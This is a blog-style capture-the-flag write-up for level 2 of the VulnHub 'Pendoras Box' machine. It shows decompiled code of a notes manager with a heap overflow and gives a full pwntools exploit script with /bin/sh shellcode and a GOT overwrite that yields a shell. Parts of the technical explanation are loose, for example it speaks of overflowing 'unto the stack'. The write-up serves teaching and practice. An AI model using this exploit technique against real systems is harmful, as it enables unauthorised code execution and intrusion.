### Pendoras Box Level `2` of `5`

![](https://www.vulnhub.com/media/img/entry/watermarked/2c242db3c7efd1c6a0c07c3fdc4a4fc15319ed95.png)

From the solution of the level 1 an executable and a README was provided on how to start up level 2 challenge

![](https://Cyberguru1.github.io/posts/VulnHub//images/pando_lvl1_sucess.png)

contents of the README file:

![](https://Cyberguru1.github.io/posts/VulnHub//images/pendo_lvl2_readme.png)

first we need to extract the executable file from the machine, this can be archived using `socat`, we use `socat` and create a local ftp server into our local machine and transfer the file over the connection as this would help for easy fuzzing and exploitation, after loading the file we tried to execute it, and we are greeted with a menu for Notes manager:

![](https://Cyberguru1.github.io/posts/VulnHub//images/pendo_lvl2_ex.png)

playing with the programm and performing fuzzing we realize that creating a new note and allocating more than 64 bits of data will cause the program to halt and throw us an error from malloc one's you try to create a new note, from this outcome we could already guess that it's a heap overflow challenge (heap overflow challenge usually occurs when a challenge is provided with a menu of some sort which have options to create,assign and delete data from the memory)

let's decompile the binary and check what exactly is going on with the new and set options using ghidra

```
        iVar1 = strcmp(local_ac,"new");
        if (iVar1 == 0) {
          local_20 = get_empty_slot();
          if (local_20 == -1) {
            puts("[!] Note list is full, please free any");
          }
          else {
            uVar2 = create_struct();
            *(undefined4 *)(local_1c + local_20 * 4) = uVar2;
            printf("[*] New note created with id %d\n");
          }
        }
        else {
          iVar1 = strcmp(local_ac,"set");
          if (iVar1 == 0) {
            readline();
            local_20 = strtol(local_ac,(char **)0x0,10);
            iVar1 = slot_exists();
            if (iVar1 == 1) {
              readline();
              local_24 = *(size_t **)(local_1c + local_20 * 4);
              sVar3 = strlen(local_ac);
              *local_24 = sVar3;
              memcpy((void *)local_24[1],local_ac,*local_24);
              printf("[*] Note %d set\n");
            }
```

we could see that our input is collected from `readline()` and stored in `iVar1` which is then compared with with each option there is in the list; once the comparision matches "new", it first of check if there are space for creating a new note by calling the function `get_empty_slot()` which then returns either a `-1` for full or `1` for more free space, the else part calls a `create_struct()` function which  does the following:

```
size_t * create_struct(void)

{
  size_t *psVar1;
  void *pvVar2;
  
  psVar1 = (size_t *)malloc(8);
  *psVar1 = 0x40;
  pvVar2 = malloc(*psVar1);
  psVar1[1] = (size_t)pvVar2;
  mprotect((void *)(psVar1[1] & 0xfffff000),*psVar1,7);
  return psVar1;
}
```

This is the most important part of these challenge so let's break each line of decompiled code accordingly

- size_t * create_struct(void): This line declares the function create_struct, which takes no arguments and returns a pointer to a size_t value (an unsigned integer type typically used for representing sizes or counts).
- size_t *psVar1;: This line declares a pointer variable named psVar1 of type size_t*. This pointer will be used to store the address of the dynamically allocated structure.
- void *pvVar2;: This line declares a void pointer variable named pvVar2. This pointer will be used to store the address returned by the malloc function.
- psVar1 = (size_t *)malloc(8);: This line dynamically allocates memory of size 8 bytes using the malloc function. The malloc function returns a void pointer, so it is cast to size_t* to match the type of psVar1. The allocated memory will be used to store the structure.
- *psVar1 = 0x40;: This line sets the value at the address pointed to by psVar1 to 0x40 (64 in decimal). This value appears to represent the size of the second allocation that will occur later in the code.
- pvVar2 = malloc(*psVar1);: This line dynamically allocates memory using the malloc function, with the size specified by the value stored in *psVar1 (which is 0x40 or 64). The address of the allocated memory is assigned to the pvVar2 pointer.
- psVar1[1] = (size_t)pvVar2;: This line assigns the value of pvVar2 (the address of the second allocation) to the second element (psVar1[1]) of the structure allocated in step 4. This element appears to hold a pointer to dynamically allocated memory.
- mprotect((void *)(psVar1[1] & 0xfffff000), *psVar1, 7);: This line calls the mprotect function, which is typically used to modify the protection of memory pages. The first argument is the address of the memory region, which is obtained by masking the least significant 12 bits of psVar1[1] with 0xfffff000 to align it to a page boundary. The second argument is the size of the memory region, which is obtained from *psVar1. The third argument is the protection value, which is set to 7 (indicating read, write, and execute permissions) in this case.
- return psVar1;: This line returns the pointer psVar1, which points to the dynamically allocated structure

The heap overflow occurs when the program writes data beyond the boundaries of a dynamically allocated heap buffer, potentially overwriting important data or control structures. In the above decompiled code, the allocations made by malloc are based on fixed sizes (8 bytes for psVar1 and *psVar1 bytes for pvVar2). Which we could overflow by writing more data than the allocated memory can hold. writing more than 64 bytes of data unto the heap could overflow the allocated memory by malloc. Let's switch to GDB to see just how much of input do we need to give the programm to spawn a lovely Shell ;)

I took the binary and load it into GDB for easy analysis, I use gdbpeda's cool utility of generating patterns so that we could easily see which part of the memory our input corrupted to, this would really save us a lot of time

![](https://Cyberguru1.github.io/posts/VulnHub//images/pendo_lvl2_gdb.png)

after the input is supplied to the program, and a new note is created then as expected the program crashes with malloc's failure of corrupted top size, we then use gdbpeda pattern offset to see how much of data we need to overflow unto the stack.

![](https://Cyberguru1.github.io/posts/VulnHub//images/pendo_lvl2_off.png)

we see it's `72 bytes` any more of about `4 bytes` would pop into the `ebp` register which is our main goal

knowing all this we use pwntools utility to write a script and a ropgadet to spawn a shell

```
#!/bin/python

from pwn import *
import struct

ellf = ELF('./level2')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

try:
    #try connecting remote
    ip = '192.168.17.129'
    port = 53121

    print("[+] Connecting to Target {0}".format(ip))
    proc = remote(ip,port)
except:
    #connect local if remote not up
    print("using local executable:")
    proc = ellf.process()

rop = ROP(ellf)

# Creating new notes
print(proc.recvuntil(b">").decode())
print("{*]Creating Note")
proc.sendline(b'new')
print(proc.recvuntil(b">").decode())
proc.sendline(b"new")
print(proc.recvuntil(b">").decode())


print("[*] Crafting payload")
# print(rop.find_gadget(['pop ebp','ret']))
# getting the pop_ebp gadget and free GOT entry
pop_ebp = hex(rop.ebp.address)
free_adr = hex(ellf.got['free'])

# Crafting a shellcode
"""
Disassembly:

0:  6a 0b                   push   0xb ; push 0xb into the stack
2:  58                      pop    eax ; content of stack into eax
3:  99                      cdq        ; perfoms sign extention 
4:  52                      push   edx ; perfoms push of sign-extended eax into edx
5:  68 2f 2f 73 68          push   0x68732f2f ; pushes "/sh" onto the stack
a:  68 2f 62 69 6e          push   0x6e69622f ; pushes "/bin" onto the stack
f:  89 e3                   mov    ebx,esp    ; mov content of stack into ebx
11: 31 c9                   xor    ecx,ecx    ; set ecx to 0
13: cd 80                   int    0x80       ; invoking system call to execute content of ebx
                                              ; effectively calling "/bin/sh" that's our shell

"""

shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

payload = shellcode + (76 - len(shellcode))*"A".encode()
payload += struct.pack('<L', int(free_adr,16))

print("[*]Sending payload to note 0: ",payload)
proc.sendline(b'set')
print(proc.recvuntil(b">").decode())
proc.sendline(b'0')
print(proc.recvuntil(b">").decode())
proc.sendline(payload)
print(proc.recvuntil(b">").decode())
print("[*] Payload sent to note 0 sucessfully")


print("[*] Sending payload to note 1")
payload = struct.pack("<L", int(pop_ebp,16))
proc.sendline(b'set')
print(proc.recvuntil(b">").decode())
proc.sendline(b'1')
print(proc.recvuntil(b">").decode())
proc.sendline(payload)
print(proc.recvuntil(b">").decode())
print("[*] Payload sent to note 1 sucessfully")

#executing payload stored in note 0 and note 1

proc.sendline(b"del")
proc.sendline(b"0")
print(proc.recvuntil(b">").decode())

print("[*] All payload sent successfully!!")

print("[*] Trying to get a sehll")

proc.interactive()

```

let's break down the code

- The first two lines imports necessary modules:

  ```
  from pwn import *
  import struct
  ```

  - from pwn import *: This imports the pwn module, which is commonly used for exploit development and provides various functionalities for interacting with processes, crafting payloads, and more.
  - import struct: This imports the struct module, which provides functions to convert between Python values and C-style binary data.
- The next lines of code initializes some variables:

  ```
   ellf = ELF('./level2')
   libc = ELF('/lib/i386-linux-gnu/libc.so.6')

   try:
       #try connecting remote
       ip = '192.168.17.129'
       port = 53121

       print("[+] Connecting to Target {0}".format(ip))
       proc = remote(ip,port)
   except:
       #connect local if remote not up
       print("using local executable:")
       proc = ellf.process()

  ```

  - within the try block of code, the elf symbols and libc are read and stored as a list into the variable `ellf` and `libc` respectively then a connection with a target IP and port using the remote() function from the pwn module. If the connection cannot be established, it falls back to using the local executable by creating a process with ellf.process().
- The script creates an instance of the ROP class, which is used for Return-Oriented Programming (ROP) exploitation technique.

  ```
  rop = ROP(ellf)
  ```

  - ROP allows executing arbitrary code by chaining together small pieces of existing code, known as "gadgets," already present in the program's memory.
- The script starts interacting with the target by sending commands and receiving responses. It follows these steps:

  ```
  print("[*]Sending payload to note 0: ",payload)
  proc.sendline(b'set')
  print(proc.recvuntil(b">").decode())
  proc.sendline(b'0')
  print(proc.recvuntil(b">").decode())
  proc.sendline(payload)
  print(proc.recvuntil(b">").decode())
  print("[*] Payload sent to note 0 sucessfully")

  print("[*] Sending payload to note 1")
  payload = struct.pack("<L", int(pop_ebp,16))
  proc.sendline(b'set')
  print(proc.recvuntil(b">").decode())
  proc.sendline(b'1')
  print(proc.recvuntil(b">").decode())
  proc.sendline(payload)
  print(proc.recvuntil(b">").decode())
  print("[*] Payload sent to note 1 sucessfully")

  ```

  - It receives the prompt from the target process and sends the "new" command twice.
  - It crafts a payload by first finding the addresses of two gadgets: a pop ebp gadget and the free function's Global Offset Table (GOT) entry. It converts the addresses to hexadecimal strings.
  - It then creates a shellcode, which is a sequence of assembly instructions that spawn a shell. The shellcode is explained in comments and stored in the shellcode variable.
  - The payload is constructed by concatenating the shellcode with a padding of "A" characters to reach a length of 76 bytes  followed by the address of the free GOT entry packed into a little-endian format.
  - The payload is sent to the target process using the "set" command and note index 0.
  - Another payload is created containing only the address of the pop ebp gadget, which will be used later. This payload is sent to note index 1.
  - It uses the "del" command to delete note index 0, which should trigger the execution of the payload stored in it.
  - It then sends the "0" command to select note index 0, which should trigger the exploit and execute the shellcode.
  - Finally, it confirms that all payloads have been sent successfully.
- The script enters an interactive mode with the proc.interactive() call, allowing the user to interact directly with the target process.this is done to gain control of a shell and perform further actions.

Execuing the script gives us our lovely shell ;), which gives us access to level3 files

![](https://Cyberguru1.github.io/posts/VulnHub//images/pendo_lvl2_shell.png)

That's it guy's
thanks for reading through.....
**Arigato**
